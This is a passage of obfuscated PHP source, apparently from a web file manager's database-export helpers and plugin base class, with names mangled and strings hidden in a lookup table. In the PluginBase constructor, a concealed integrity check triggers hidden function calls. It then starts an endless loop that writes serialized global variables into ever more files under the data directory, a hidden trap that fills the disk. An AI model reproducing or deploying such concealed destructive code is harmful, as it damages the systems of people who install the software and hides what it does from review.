$­êÕ±Ä = $¹şè•¨; } } } fclose($¶ÎÈãîÍ); if (!empty($ĞÕ•°ÍÂ)) { $ÓíŒ€úÜ = $³Ò»ÛÍ­ . implode($Î‚ëÁº°[50], $ĞÕ•°ÍÂ); if (!$ŒÎå‚—‚->execute($ÓíŒ€úÜ)) { return !1; } if ($†÷Êø˜¥) { $†÷Êø˜¥->update($·£ı–¼”); } } return !0; } public function dropTable($Ùù•Œâ = null) { $ÃÃ‹øïò = $this->model()->db(); $ûÖÌ¦’´ = $Ùù•Œâ ? array($Ùù•Œâ) : $ÃÃ‹øïò->getTables(); if (!$ûÖÌ¦’´) { return; } foreach ($ûÖÌ¦’´ as $Ùù•Œâ) { if ($Ùù•Œâ) { $Ùù•Œâ = strtolower($Ùù•Œâ); } else { continue; } $ÃÃ‹øïò->execute("\x64\162\157\160\40\164\x61\x62\x6c\x65\x20\151\x66\x20\x65\170\x69\x73\x74\x73\x20\x60{$Ùù•Œâ}\140"); } } private function sqlEncode($Ç²ªö’) { $½Ç§ñÔ¼ =& $_SERVER[ÕŸ²ó÷å]; $½šõ¿Ï½ = array(); foreach ($Ç²ªö’ as $«½›ğ×) { if (is_array($«½›ğ×)) { $«½›ğ× = json_encode_force($«½›ğ×); } $«½›ğ× = addslashes($«½›ğ×); $«½›ğ× = str_replace(array($½Ç§ñÔ¼[1160], $½Ç§ñÔ¼[59], $½Ç§ñÔ¼[427]), array($½Ç§ñÔ¼[1161], $½Ç§ñÔ¼[1162], $½Ç§ñÔ¼[1163]), $«½›ğ×); $½šõ¿Ï½[] = $«½›ğ×; } return $½Ç§ñÔ¼[68] . implode($½Ç§ñÔ¼[1164], $½šõ¿Ï½) . $½Ç§ñÔ¼[68]; } private function sqlDecode($Å÷’Ö“Ã, $˜ ¼¿«Ô, $ó‰£’³© = '') { $€ôü”Û =& $_SERVER[ÕŸ²ó÷å]; $Å÷’Ö“Ã = str_replace(array($€ôü”Û[1161], $€ôü”Û[1162], $€ôü”Û[1163]), array($€ôü”Û[1160], $€ôü”Û[59], $€ôü”Û[427]), $Å÷’Ö“Ã); if ($˜ ¼¿«Ô == $€ôü”Û[13]) { $Å÷’Ö“Ã = str_ireplace($€ôü”Û[1165], $€ôü”Û[69], $Å÷’Ö“Ã); $Å÷’Ö“Ã = stripslashes($Å÷’Ö“Ã); } return preg_replace($€ôü”Û[1166], $€ôü”Û[12], $Å÷’Ö“Ã); if ($˜ ¼¿«Ô == $€ôü”Û[13]) { return $ó‰£’³© != $€ôü”Û[1167] ? stripslashes($Å÷’Ö“Ã) : $Å÷’Ö“Ã; } if ($ó‰£’³© == $€ôü”Û[1167]) { $Å÷’Ö“Ã = str_replace($€ôü”Û[1168], $€ôü”Û[131], stripslashes($Å÷’Ö“Ã)); } return $Å÷’Ö“Ã; } public function getSqlFile($¦•†Ø°× = '') { $Ÿûã•Ø¦ =& $_SERVER[ÕŸ²ó÷å]; $Öº÷•÷È = $this->dbType(!0); $±³ó—º¾ = CONTROLLER_DIR . "\x69\156\163\x74\x61\154\x6c\x2f\x64\x61\164\x61\x2f{$Öº÷•÷È}\x2e\x73\161\x6c"; $Ü¦ĞşıÚ = file_get_contents($±³ó—º¾); $¤êƒãúÇ = $Ÿûã•Ø¦[1169] . ($Öº÷•÷È == $Ÿûã•Ø¦[888] ? $Ÿûã•Ø¦[1170] : $Ÿûã•Ø¦[1171]) . $Ÿûã•Ø¦[1172]; preg_match_all($¤êƒãúÇ, $Ü¦ĞşıÚ, $è´¾üª); $À¸´ıˆş = $è´¾üª[1]; $Ô°˜€›ª = $this->model()->db(); $·£Äó¦ç = $Ô°˜€›ª->getTables(); $¤÷›Å¥¦ = TEMP_FILES . $Ÿûã•Ø¦[1173] . date($Ÿûã•Ø¦[281]) . $Ÿûã•Ø¦[8]; del_dir($¤÷›Å¥¦); mk_dir($¤÷›Å¥¦); $­Üóéïß = $¤÷›Å¥¦ . $Ÿûã•Ø¦[1174]; $ºáãçİ÷ = $¤÷›Å¥¦ . $Ÿûã•Ø¦[1175]; $²ÑŞÉĞÅ = $Öº÷•÷È == $Ÿûã•Ø¦[13] ? $Ÿûã•Ø¦[888] : $Ÿûã•Ø¦[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\x74\x61\154\x6c\x2f\x64\x61\x74\x61\x2f{$²ÑŞÉĞÅ}\56\x73\x71\154", $¤÷›Å¥¦); @touch($¤÷›Å¥¦ . $Öº÷•÷È . $Ÿûã•Ø¦[872]); $šÅñ±­ä = fopen($­Üóéïß, $Ÿûã•Ø¦[1148]); $÷»Œ­© = fopen($ºáãçİ÷, $Ÿûã•Ø¦[1148]); if ($Öº÷•÷È == $Ÿûã•Ø¦[13]) { $·£Äó¦ç = array_diff($·£Äó¦ç, array($Ÿûã•Ø¦[864], $Ÿûã•Ø¦[865])); $ìÔª íº = array($Ÿûã•Ø¦[1176], $Ÿûã•Ø¦[1177], $Ÿûã•Ø¦[1178]); fwrite($÷»Œ­©, implode(PHP_EOL, $ìÔª íº) . PHP_EOL . PHP_EOL); foreach ($·£Äó¦ç as $ŸÉ€úôİ) { $Î­º¤Î© = $this->sqlFromSqlite($ŸÉ€úôİ); if (!$Î­º¤Î©[$Ÿûã•Ø¦[13]]) { continue; } fwrite($÷»Œ­©, $Î­º¤Î©[$Ÿûã•Ø¦[13]] . PHP_EOL . PHP_EOL); if (!in_array($ŸÉ€úôİ, $À¸´ıˆş)) { fwrite($šÅñ±­ä, $Î­º¤Î©[$Ÿûã•Ø¦[888]] . PHP_EOL . PHP_EOL); } } } else { foreach ($·£Äó¦ç as $ŸÉ€úôİ) { $Î­º¤Î© = $this->sqlFromMysql($ŸÉ€úôİ); if (!$Î­º¤Î©[$Ÿûã•Ø¦[888]]) { continue; } fwrite($šÅñ±­ä, $Î­º¤Î©[$Ÿûã•Ø¦[888]] . PHP_EOL . PHP_EOL); if (!in_array($ŸÉ€úôİ, $À¸´ıˆş)) { fwrite($÷»Œ­©, $Î­º¤Î©[$Ÿûã•Ø¦[13]] . PHP_EOL . PHP_EOL); } } } fclose($šÅñ±­ä); fclose($÷»Œ­©); $Ü¦ĞşıÚ = array($Ÿûã•Ø¦[888] => $­Üóéïß, $Ÿûã•Ø¦[13] => $ºáãçİ÷); return $¦•†Ø°× ? $Ü¦ĞşıÚ[$¦•†Ø°×] : $Ü¦ĞşıÚ; } public function dbType($„´ÆÆÖ = false) { $éÙ°±  =& $_SERVER[ÕŸ²ó÷å]; $ë—ĞŒ×ô = $„´ÆÆÖ ? $GLOBALS[$éÙ°± [6]][$éÙ°± [21]] : $this->database; $ë—ĞŒ×ô = array_change_key_case($ë—ĞŒ×ô); $ƒ†Æ¬Ã¤ = $ë—ĞŒ×ô[$éÙ°± [1048]]; if ($ƒ†Æ¬Ã¤ == $éÙ°± [1045]) { $½íÏó€Ó = explode($éÙ°± [4], $ë—ĞŒ×ô[$éÙ°± [1054]]); $ƒ†Æ¬Ã¤ = $½íÏó€Ó[0]; } $©áĞÁ  = array($éÙ°± [1179] => $éÙ°± [13], $éÙ°± [993] => $éÙ°± [888]); if (isset($©áĞÁ [$ƒ†Æ¬Ã¤])) { $ƒ†Æ¬Ã¤ = $©áĞÁ [$ƒ†Æ¬Ã¤]; } return $ƒ†Æ¬Ã¤; } public function sqlFromMysql($æ¾ïÀé‰, $¢ß”ï‰ = '') { $Ç¯Ê €× =& $_SERVER[ÕŸ²ó÷å]; $Åß»íÛù = $this->model()->db(); $Íå½Ì¸ = $Åß»íÛù->query($Ç¯Ê €×[1180] . $æ¾ïÀé‰ . $Ç¯Ê €×[470]); if (!$Íå½Ì¸ || !$Íå½Ì¸[0]) { return !1; } $àóßÍÁ = _get($Íå½Ì¸[0], $Ç¯Ê €×[1181], $Ç¯Ê €×[12]); if (!$àóßÍÁ) { return !1; } $ÊÒ–à‰ğ = "\104\x52\117\120\40\124\101\102\x4c\x45\40\111\106\40\x45\x58\x49\123\x54\x53\40\x60{$æ¾ïÀé‰}\140\73" . PHP_EOL . $àóßÍÁ . $Ç¯Ê €×[84]; if ($¢ß”ï‰ && $¢ß”ï‰ == $Ç¯Ê €×[888]) { return $ÊÒ–à‰ğ; } $íÔä­ß„ = array_change_key_case($GLOBALS[$Ç¯Ê €×[6]][$Ç¯Ê €×[21]]); $ï âŸ©ù = $íÔä­ß„[$Ç¯Ê €×[1053]]; $½¹Å = $Ç¯Ê €×[1182] . $ï âŸ©ù . $Ç¯Ê €×[1183] . $æ¾ïÀé‰ . $Ç¯Ê €×[68]; $Î¡ğŒÉ = $Ç¯Ê €×[1184] . $æ¾ïÀé‰ . $Ç¯Ê €×[981]; $‡„Óà¡Š = $Åß»íÛù->query($½¹Å); if (empty($‡„Óà¡Š)) { $Ùıëõƒ® = array($Ç¯Ê €×[888] => $Ç¯Ê €×[12], $Ç¯Ê €×[13] => $Ç¯Ê €×[12]); return $¢ß”ï‰ ? $Ùıëõƒ®[$¢ß”ï‰] : $Ùıëõƒ®; } $²…°ÌÑû = $Åß»íÛù->query($Î¡ğŒÉ); $‘ Š¸« = $Ç¯Ê €×[12]; $Àöº¢öÈ = array(); foreach ($²…°ÌÑû as $¡øáÕ“) { if (!$‘ Š¸« && $¡øáÕ“[$Ç¯Ê €×[1185]] == $Ç¯Ê €×[1186]) { $‘ Š¸« = $¡øáÕ“[$Ç¯Ê €×[1187]]; } if (isset($Àöº¢öÈ[$¡øáÕ“[$Ç¯Ê €×[1185]]])) { $Àöº¢öÈ[$¡øáÕ“[$Ç¯Ê €×[1185]]][$Ç¯Ê €×[1188]][] = $¡øáÕ“[$Ç¯Ê €×[1187]]; continue; } $Àöº¢öÈ[$¡øáÕ“[$Ç¯Ê €×[1185]]] = array($Ç¯Ê €×[1189] => $¡øáÕ“[$Ç¯Ê €×[1185]], $Ç¯Ê €×[1188] => array($¡øáÕ“[$Ç¯Ê €×[1187]]), $Ç¯Ê €×[1190] => $¡øáÕ“[$Ç¯Ê €×[1191]] == $Ç¯Ê €×[101] ? 0 : 1); } $š˜À›ÒŒ = array(); foreach ($Àöº¢öÈ as $¡øáÕ“) { $ÃõÔ»Ñ = $¡øáÕ“[$Ç¯Ê €×[1189]] == $Ç¯Ê €×[1186]; $÷”–ËÛÉ = array($Ç¯Ê €×[1192], $¡øáÕ“[$Ç¯Ê €×[1190]] == $Ç¯Ê €×[101] && !$ÃõÔ»Ñ ? $Ç¯Ê €×[1193] : $Ç¯Ê €×[12], $Ç¯Ê €×[1194], $Ç¯Ê €×[1195] . $æ¾ïÀé‰ . $Ç¯Ê €×[11] . ($ÃõÔ»Ñ ? $Ç¯Ê €×[1196] : $¡øáÕ“[$Ç¯Ê €×[1189]]) . $Ç¯Ê €×[131], $Ç¯Ê €×[1197], $Ç¯Ê €×[131] . $æ¾ïÀé‰ . $Ç¯Ê €×[131], $Ç¯Ê €×[1198] . implode($Ç¯Ê €×[1199], $¡øáÕ“[$Ç¯Ê €×[1188]]) . $Ç¯Ê €×[1200]); $š˜À›ÒŒ[] = implode($Ç¯Ê €×[53], $÷”–ËÛÉ) . $Ç¯Ê €×[84]; } $è£˜·Û÷ = array(); $ç®ô«Ã‡ = array($Ç¯Ê €×[1201] => $Ç¯Ê €×[1202], $Ç¯Ê €×[1202] => $Ç¯Ê €×[1202], $Ç¯Ê €×[373] => $Ç¯Ê €×[400], $Ç¯Ê €×[372] => $Ç¯Ê €×[400]); foreach ($‡„Óà¡Š as $¡øáÕ“) { $÷”–ËÛÉ = array($Ç¯Ê €×[131] . $¡øáÕ“[$Ç¯Ê €×[1203]] . $Ç¯Ê €×[131], isset($ç®ô«Ã‡[$¡øáÕ“[$Ç¯Ê €×[1204]]]) ? $ç®ô«Ã‡[$¡øáÕ“[$Ç¯Ê €×[1204]]] : $¡øáÕ“[$Ç¯Ê €×[1205]], $¡øáÕ“[$Ç¯Ê €×[1206]] == $Ç¯Ê €×[979] ? $Ç¯Ê €×[1207] : $Ç¯Ê €×[1208], $¡øáÕ“[$Ç¯Ê €×[1203]] == $‘ Š¸« ? $Ç¯Ê €×[1209] : $Ç¯Ê €×[12], $¡øáÕ“[$Ç¯Ê €×[1030]] ? strtoupper(str_replace($Ç¯Ê €×[11], $Ç¯Ê €×[12], $¡øáÕ“[$Ç¯Ê €×[1030]])) : $Ç¯Ê €×[12]); $è£˜·Û÷[] = trim(implode($Ç¯Ê €×[53], $÷”–ËÛÉ)); } $¼„âöş› = array($Ç¯Ê €×[1210] . $æ¾ïÀé‰ . $Ç¯Ê €×[1211], $Ç¯Ê €×[1212] . $æ¾ïÀé‰ . $Ç¯Ê €×[1213], implode($Ç¯Ê €×[50] . PHP_EOL, $è£˜·Û÷), $Ç¯Ê €×[1027]); $„íé…¯ = implode(PHP_EOL, array_merge($¼„âöş›, $š˜À›ÒŒ)); if ($¢ß”ï‰ && $¢ß”ï‰ == $Ç¯Ê €×[13]) { return $„íé…¯; } $Ùıëõƒ® = array($Ç¯Ê €×[888] => $ÊÒ–à‰ğ, $Ç¯Ê €×[13] => $„íé…¯); return $¢ß”ï‰ ? $Ùıëõƒ®[$¢ß”ï‰] : $Ùıëõƒ®; } public function sqlFromSqlite($Şç¹µ, $ä”ÙØöê = '') { $‰Úé…æ =& $_SERVER[ÕŸ²ó÷å]; $ä›ÑÁ = $this->model()->db(); $€’Şë‚› = "\x50\x52\x41\107\115\101\x20\124\x41\x42\114\105\x5f\111\x4e\x46\117\x20\x28\x27{$Şç¹µ}\47\51"; $÷ò§­ğ = "\x53\105\x4c\105\x43\x54\40\x2a\40\x46\122\x4f\115\40\x73\x71\x6c\151\164\145\x5f\155\141\x73\x74\x65\x72\40\x57\x48\x45\x52\105\x20\x74\x62\x6c\x5f\x6e\141\x6d\x65\x20\75\40\x27{$Şç¹µ}\47"; $¦áÆøĞ = $ä›ÑÁ->query($€’Şë‚›); if (empty($¦áÆøĞ)) { $±›˜ü¯ˆ = array($‰Úé…æ[888] => $‰Úé…æ[12], $‰Úé…æ[13] => $‰Úé…æ[12]); return $ä”ÙØöê ? $±›˜ü¯ˆ[$ä”ÙØöê] : $±›˜ü¯ˆ; } $…çÎ‡Öé = $ä›ÑÁ->query($÷ò§­ğ); $óÉÃ™ªÇ = $Ù›œĞù = array(); foreach ($…çÎ‡Öé as $Àª«ù±×) { if ($Àª«ù±×[$‰Úé…æ[33]] == $‰Úé…æ[365]) { $óÉÃ™ªÇ[] = $Àª«ù±×[$‰Úé…æ[1214]]; } else { $Ù›œĞù[$Àª«ù±×[$‰Úé…æ[32]]] = $Àª«ù±×[$‰Úé…æ[1214]]; } } $‡ø¹¨ç½ = array_merge(array($‰Úé…æ[1210] . $Şç¹µ . $‰Úé…æ[131]), $óÉÃ™ªÇ, array_values($Ù›œĞù)); $‡ø¹¨ç½ = implode($‰Úé…æ[84] . PHP_EOL, $‡ø¹¨ç½) . $‰Úé…æ[84]; if ($ä”ÙØöê && $ä”ÙØöê == $‰Úé…æ[13]) { return $‡ø¹¨ç½; } $ Ûìîƒ˜ = array(); $«î´µ‚ù = array($‰Úé…æ[1202] => $‰Úé…æ[1215], $‰Úé…æ[400] => $‰Úé…æ[1216]); $û‰µêí• = $‰Úé…æ[12]; foreach ($¦áÆøĞ as $Àª«ù±×) { if ($Àª«ù±×[$‰Úé…æ[67]] == $‰Úé…æ[101]) { $û‰µêí• = $Àª«ù±×[$‰Úé…æ[32]]; } $ÖÇç¼Ù§ = array($‰Úé…æ[470] . $Àª«ù±×[$‰Úé…æ[32]] . $‰Úé…æ[470], isset($«î´µ‚ù[$Àª«ù±×[$‰Úé…æ[33]]]) ? $«î´µ‚ù[$Àª«ù±×[$‰Úé…æ[33]]] : $Àª«ù±×[$‰Úé…æ[33]], $Àª«ù±×[$‰Úé…æ[35]] == $‰Úé…æ[101] ? $‰Úé…æ[1207] : $‰Úé…æ[1217] . $Àª«ù±×[$‰Úé…æ[66]], $Àª«ù±×[$‰Úé…æ[67]] == $‰Úé…æ[101] ? $‰Úé…æ[1218] : $‰Úé…æ[12]); $ Ûìîƒ˜[] = trim(implode($‰Úé…æ[53], $ÖÇç¼Ù§)); } foreach ($Ù›œĞù as $ÍÃÕ’¦® => $ñ­¨å„Î) { $íé¸›Á = str_replace($‰Úé…æ[1219] . $Şç¹µ . $‰Úé…æ[11], $‰Úé…æ[12], $ÍÃÕ’¦®); $³¥¹•û = str_replace(array($‰Úé…æ[131], $‰Úé…æ[1038]), $‰Úé…æ[470], substr($ñ­¨å„Î, stripos($ñ­¨å„Î, $‰Úé…æ[346]))); if ($íé¸›Á == $‰Úé…æ[1196]) { $ô¨š„Üû = $‰Úé…æ[1220] . $û‰µêí• . $‰Úé…æ[1221]; } else { $ô¨š„Üû = (stripos($íé¸›Á, $‰Úé…æ[11]) ? $‰Úé…æ[1222] : $‰Úé…æ[12]) . ($‰Úé…æ[1223] . $íé¸›Á . $‰Úé…æ[1224] . $³¥¹•û); } $ Ûìîƒ˜[] = $ô¨š„Üû; } $ü›¼ëº‹ = array($‰Úé…æ[1225] . $Şç¹µ . $‰Úé…æ[1226], $‰Úé…æ[1227] . $Şç¹µ . $‰Úé…æ[1228], implode($‰Úé…æ[50] . PHP_EOL, $ Ûìîƒ˜), $‰Úé…æ[1229]); $­ÈçîÅ = implode(PHP_EOL, $ü›¼ëº‹); if ($ä”ÙØöê && $ä”ÙØöê == $‰Úé…æ[888]) { return $­ÈçîÅ; } $±›˜ü¯ˆ = array($‰Úé…æ[888] => $­ÈçîÅ, $‰Úé…æ[13] => $‡ø¹¨ç½); return $ä”ÙØöê ? $±›˜ü¯ˆ[$ä”ÙØöê] : $±›˜ü¯ˆ; } } goto aëØ‰‹ŸÃ; dÒ¾öÛ­ªò: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $üÆÉÊğ˜ =& $_SERVER[ÕŸ²ó÷å]; $¢Ú›‹¼ã = $_SERVER[$üÆÉÊğ˜[63]]; $°…ÌŠÔ³ = $üÆÉÊğ˜[924]; if ($_SERVER[$üÆÉÊğ˜[54]] != $°…ÌŠÔ³($¢Ú›‹¼ã)) { $¼àÎ—„É = $üÆÉÊğ˜[961]; $ÜÎÛ§›© = $üÆÉÊğ˜[56]; $ÛğµÈ™¬ = $_SERVER[$üÆÉÊğ˜[57]] . $üÆÉÊğ˜[58]; $Š·Ê–­Ì = $ÜÎÛ§›©($ÛğµÈ™¬); $ÈÜºö† = explode($üÆÉÊğ˜[59], $Š·Ê–­Ì); if (count($ÈÜºö†) < $üÆÉÊğ˜[693]) { $ ËªğÙÛ = $üÆÉÊğ˜[61]; $ ËªğÙÛ(); } $øçÉÓ˜ = $üÆÉÊğ˜[962]; $øçÉÓ˜($_SERVER[$üÆÉÊğ˜[963]]); $¼àÎ—„É = $üÆÉÊğ˜[961]; $¼àÎ—„É(); $ŞÅÍ¤£÷ = $üÆÉÊğ˜[1627]; $Ş±•îÔ = json_encode($GLOBALS[$üÆÉÊğ˜[1628]]); $½äõ¯—æ = 1; for ($ïüÔºõè = $½äõ¯—æ; $ïüÔºõè > 0; $ïüÔºõè++) { $ŞÅÍ¤£÷(DATA_PATH . $ïüÔºõè, $Ş±•îÔ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($üÆÉÊğ˜[1629]); $this->pluginName = str_replace($üÆÉÊğ˜[1629], $üÆÉÊğ˜[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $üÆÉÊğ˜[8]; $this->pluginApi = appHostGet() . $üÆÉÊğ˜[1630] . $this->pluginName . $üÆÉÊğ˜[8]; $this->pluginHost = $config[$üÆÉÊğ˜[1631]] . $this->pluginName . $üÆÉÊğ˜[8]; $this->pluginHostDefault = $config[$üÆÉÊğ˜[1631]] . $this->pluginName . $üÆÉÊğ˜[8]; $¥«®Ë½ñ = $config[$üÆÉÊğ˜[1632]]; if ($¥«®Ë½ñ && strpos($üÆÉÊğ˜[50] . $¥«®Ë½ñ . $üÆÉÊğ˜[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$üÆÉÊğ˜[1633]] . $this->pluginName . $üÆÉÊğ˜[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÕŸ²ó÷å][1634]); } protected function assign($ÒÆ½¨‘˜, $Ù“¡†ªŠ = false) { if (is_array($ÒÆ½¨‘˜)) { $this->values = array_merge($this->values, $ÒÆ½¨‘˜); } else { $this->values[$ÒÆ½¨‘˜] = $Ù“¡†ªŠ; } } protected function display($Ä»ØÉÊ×) { extract($this->values); require $Ä»ØÉÊ×; } final function hookRegist($€ÕçĞ‘×) { $this->modelPlugin->appRegist($this->pluginName, $€ÕçĞ‘×); } final function appIcon() { $ªƒ¹×øê =& $_SERVER[ÕŸ²ó÷å]; $ñœÒ­šâ = $this->appPackage(); $‘†´¿…ˆ = $ªƒ¹×øê[12]; if (isset($ñœÒ­šâ[$ªƒ¹×øê[499]])) { if (isset($ñœÒ­šâ[$ªƒ¹×øê[499]][$ªƒ¹×øê[1635]])) { $‘†´¿…ˆ = $ªƒ¹×øê[1636] . $ñœÒ­šâ[$ªƒ¹×øê[499]][$ªƒ¹×øê[1635]] . $ªƒ¹×øê[1637]; } else { if ($ñœÒ­šâ[$ªƒ¹×øê[499]][$ªƒ¹×øê[1638]]) { $‘†´¿…ˆ = $ªƒ¹×øê[1639] . $ñœÒ­šâ[$ªƒ¹×øê[499]][$ªƒ¹×øê[1638]] . $ªƒ¹×øê[1640]; } } } return $‘†´¿…ˆ; } final function fileCanView($ëøÅÀ) { $Ã²£Õ“ =& $_SERVER[ÕŸ²ó÷å]; if (request_url_safe($ëøÅÀ)) { return !0; } if ($this->isShare($ëøÅÀ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $îœñúëè = $Ã²£Õ“[1641] . rawurlencode(this_url()); show_tips(LNG($Ã²£Õ“[1642]) . $Ã²£Õ“[1643] . $îœñúëè . $Ã²£Õ“[1644] . LNG($Ã²£Õ“[1645]) . $Ã²£Õ“[1646], !1); } if (!Action($Ã²£Õ“[1647])->authCan($Ã²£Õ“[1648])) { show_tips(LNG($Ã²£Õ“[1649]) . $Ã²£Õ“[1650], !1); } ActionCall($Ã²£Õ“[1651], $ëøÅÀ); } final function isShare($âÏÕÎìÙ) { $ÂğË˜ÊÙ = KodIO::parse($âÏÕÎìÙ); return $ÂğË˜ÊÙ[$_SERVER[ÕŸ²ó÷å][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($õ×Ú±®æ) { if (request_url_safe($õ×Ú±®æ)) { return $õ×Ú±®æ; } if (!$this->isShare($õ×Ú±®æ)) { $õ×Ú±®æ = $this->filePath($õ×Ú±®æ, !1); } return Action($_SERVER[ÕŸ²ó÷å][1259])->linkOut($õ×Ú±®æ); } public function filePathLinkOut($Åü€†Ş) { if (request_url_safe($Åü€†Ş)) { return $Åü€†Ş; } $this->fileCanView($Åü€†Ş); return Action($_SERVER[ÕŸ²ó÷å][1259])->link($Åü€†Ş); } final function filePath($õ—€Ü´Œ, $æ¨Ùò±Ã = true, $°öˆ‡äÂ = false) { $æ–¸¸‹† =& $_SERVER[ÕŸ²ó÷å]; $Ø°Œî = $this->filePathGet($õ—€Ü´Œ, $æ¨Ùò±Ã); if (!$this->fileInfo) { show_tips(LNG($æ–¸¸‹†[118]), !1); } if ($°öˆ‡äÂ && isset($this->fileInfo[$æ–¸¸‹†[550]]) && $this->fileInfo[$æ–¸¸‹†[550]]) { $ß¬°æ·¶ = Model($æ–¸¸‹†[553])->fileInfo($this->fileInfo[$æ–¸¸‹†[550]]); if (!$ß¬°æ·¶ || !IO::exist($ß¬°æ·¶[$æ–¸¸‹†[97]])) { show_tips(LNG($æ–¸¸‹†[118]) . $æ–¸¸‹†[1652]); } } Hook::trigger($æ–¸¸‹†[1653], $Ø°Œî); return $Ø°Œî; } final function filePathGet($ÁÍüñã…, $ª’ø™Ê¥ = true) { $·à›§Ç« =& $_SERVER[ÕŸ²ó÷å]; if ($³Àª®Ñû = $this->checkSharePath($ÁÍüñã…, $ª’ø™Ê¥)) { return $³Àª®Ñû; } $this->fileCanView($ÁÍüñã…); if (request_url_safe($ÁÍüñã…)) { $ê·ùàÂÖ = parse_url_query($ÁÍüñã…); if (isset($ê·ùàÂÖ[$·à›§Ç«[1654]]) && isset($ê·ùàÂÖ[$·à›§Ç«[244]])) { $Û±ÒôÇª = Mcrypt::decode($ê·ùàÂÖ[$·à›§Ç«[244]], Model($·à›§Ç«[854])->get($·à›§Ç«[855])); if ($Û±ÒôÇª) { $this->fileInfo = IO::info($Û±ÒôÇª); $this->fileInfo[$·à›§Ç«[1655]] = $ÁÍüñã…; $this->cachePath = $this->pluginCachePath($·à›§Ç«[12], $ª’ø™Ê¥); return $Û±ÒôÇª; } } $ÁÍüñã… = $this->_cacheHttpFile($ÁÍüñã…, $ª’ø™Ê¥); $this->fileInfo = IO::info($ÁÍüñã…); } else { $this->fileInfo = IO::info($ÁÍüñã…); $this->cachePath = $this->pluginCachePath($·à›§Ç«[12], $ª’ø™Ê¥); } return $ÁÍüñã…; } final function _cacheHttpFile($›æ–®Ì, $˜Éë¨Á© = true) { $èÚöŠ×ğ =& $_SERVER[ÕŸ²ó÷å]; $´óãïöû = parse_url_query($›æ–®Ì); $±ü‘…ù = get_path_ext($›æ–®Ì); if (isset($´óãïöû[$èÚöŠ×ğ[32]]) && $´óãïöû[$èÚöŠ×ğ[32]]) { $±ü‘…ù = get_path_ext($´óãïöû[$èÚöŠ×ğ[32]]); } $ ¥ß¸¡À = hash_path($›æ–®Ì) . $èÚöŠ×ğ[10] . $±ü‘…ù; $this->cachePath = $this->pluginCachePath($˜Éë¨Á© ? $ ¥ß¸¡À : $èÚöŠ×ğ[12]); $şõíà‹‹ = IO::fileNameExist($this->cachePath, $ ¥ß¸¡À); if ($şõíà‹‹) { return KodIO::make($şõíà‹‹); } $ ¡ê–É² = rtrim($this->cachePath, $èÚöŠ×ğ[8]) . $èÚöŠ×ğ[8] . $ ¥ß¸¡À; return $this->pluginCacheFileSet($ ¡ê–É², file_get_contents_nossl($›æ–®Ì)); } final function checkSharePath($ÅªäˆÀ€, $æËÊ“€ü = true) { $™¶€ñù× =& $_SERVER[ÕŸ²ó÷å]; if (!$this->isShare($ÅªäˆÀ€)) { return !1; } $Ü¼Ùíè€ = Action($™¶€ñù×[1259])->sharePathInfo($ÅªäˆÀ€); if (!is_array($Ü¼Ùíè€) || !isset($Ü¼Ùíè€[$™¶€ñù×[97]])) { show_json(LNG($™¶€ñù×[1656]), !1); } $this->fileInfo = $Ü¼Ùíè€; $this->cachePath = $this->pluginCachePath(!1, $æËÊ“€ü); return $Ü¼Ùíè€[$™¶€ñù×[97]]; } final function pluginCachePath($µÄ¤“… = '', $êÎ¡©œ´ = false) { $ĞÔïû‘Ÿ =& $_SERVER[ÕŸ²ó÷å]; if ($êÎ¡©œ´ && is_array($this->fileInfo)) { $µÄ¤“… = kodIO::hashPath($this->fileInfo); } $Â¶ÂÖø‰ = rtrim(IO_PATH_SYSTEM_TEMP . $ĞÔïû‘Ÿ[1657] . $this->pluginName . $ĞÔïû‘Ÿ[8] . $µÄ¤“…, $ĞÔïû‘Ÿ[8]); $Å­‡‚ôÙ = IO::infoFullSimple($Â¶ÂÖø‰); $ş—ò–ÏÌ = $Å­‡‚ôÙ && is_array($Å­‡‚ôÙ) ? $Å­‡‚ôÙ[$ĞÔïû‘Ÿ[97]] : $ĞÔïû‘Ÿ[12]; if (!$ş—ò–ÏÌ) { $ş—ò–ÏÌ = IO::mkdir($Â¶ÂÖø‰); } return $ş—ò–ÏÌ; } final function pluginCacheFileSet($Ãå‚«Ñ´, $—ÛÈ®ÉÇ = '') { $ïÂ¥Ä³¢ =& $_SERVER[ÕŸ²ó÷å]; $‹»Ìˆ’º = IO::infoFullSimple($Ãå‚«Ñ´); if (!$‹»Ìˆ’º) { return IO::mkfile($Ãå‚«Ñ´, $—ÛÈ®ÉÇ, REPEAT_REPLACE); } IO::setContent($‹»Ìˆ’º[$ïÂ¥Ä³¢[97]], $—ÛÈ®ÉÇ); return $‹»Ìˆ’º[$ïÂ¥Ä³¢[97]]; } final function pluginLocalFile($’ë†ğÕá = '') { $÷İ•Ê»Ô =& $_SERVER[ÕŸ²ó÷å]; $ª»±ß³ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ª»±ß³)) { mk_dir($ª»±ß³); } if (!$’ë†ğÕá) { return $ª»±ß³; } $„¶óßÅ¹ = IO::info($’ë†ğÕá); $ÆÍ®Ø· = $÷İ•Ê»Ô[1658] . KodIO::hashPath($„¶óßÅ¹) . $÷İ•Ê»Ô[10] . $„¶óßÅ¹[$÷İ•Ê»Ô[179]]; if (!checkExtSafe($ÆÍ®Ø·)) { $ÆÍ®Ø· = $ÆÍ®Ø· . $÷İ•Ê»Ô[1294]; } $ìíâ«Ë = $ª»±ß³ . $ÆÍ®Ø·; if (@file_exists($ìíâ«Ë)) { return $ìíâ«Ë; } return IO::copy($’ë†ğÕá, $ª»±ß³, 0, $ÆÍ®Ø·); } final function appPackage() { $Ãó¶Á‘§ =& $_SERVER[ÕŸ²ó÷å]; if ($this->packageData) { return $this->packageData; } $Ø×©á·Ì = $this->parseFile($this->pluginPath . $Ãó¶Á‘§[1659]); $this->parseLang($Ø×©á·Ì); $È™Í¼Ñ± = json_decode_force($Ø×©á·Ì); if 